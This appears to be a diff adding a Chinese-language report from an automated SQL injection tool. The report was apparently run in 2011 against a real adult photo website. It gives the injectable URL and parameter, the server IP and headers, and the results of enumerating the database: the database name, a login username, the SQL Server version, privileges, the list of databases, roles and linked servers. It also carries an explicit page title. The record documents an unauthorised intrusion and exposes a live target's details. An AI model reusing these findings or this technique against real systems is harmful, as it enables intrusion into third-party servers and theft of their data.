@@ -1,0 +1,103 @@
+■漏洞信息:============================================================
+ ·URL:http://www.xxxratemypic.com/xxxratemypicphoto.asp?picid=9153
+ ·页面标题：
+NSFW Couples Photo | tags: Fucking on the beach  
+ ·参数:picid=9153
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:69.9.33.67
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 16:20:49 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 16158
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCQTCRBTS=BFBAHHEAGAADLDOCIAENGIBB; path=/
+Cache-control: no-cache
+
+
+
+■数据库信息:============================================================
+- 数据库名：ratemypic
+- 用户名：KDIUDAJDkjnkjndafas78528N
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：BACKUP
+- 服务名：MSSQLSERVER
+- 系统用户名：KDIUDAJDkjnkjndafas78528N
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+msdb		
+extremepimping		
+wsdds		
+genx		
+wipsearch		
+advmodule		
+ratemypic		
+capture		
+picsandvids		
+xxxratemyvid		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.????????	Apr  8 2003  9:10AM	
+dbo			Apr  8 2003  9:10AM	
+guest		.	Apr  8 2003  9:10AM	
+db_owner		?..?.......?.	Apr  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	Apr  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	Apr  8 2003  9:10AM	
+db_datareader		?..?.......?.	Apr  8 2003  9:10AM	
+db_datawriter		?..?.......?.	Apr  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	Apr  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	Apr  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	BACKUP1	7284	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+BACKUP	SQL Server	SQLOLEDB	BACKUP		BACKUP	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+错误代码: 0x80004005
+错误原因: [Microsoft][ODBC 驱动程序管理器] 未发现数据源名称并且未指定默认驱动程序
+Dir of C:: 
+错误代码: 0x80004005
+错误原因: [Microsoft][ODBC 驱动程序管理器] 未发现数据源名称并且未指定默认驱动程序
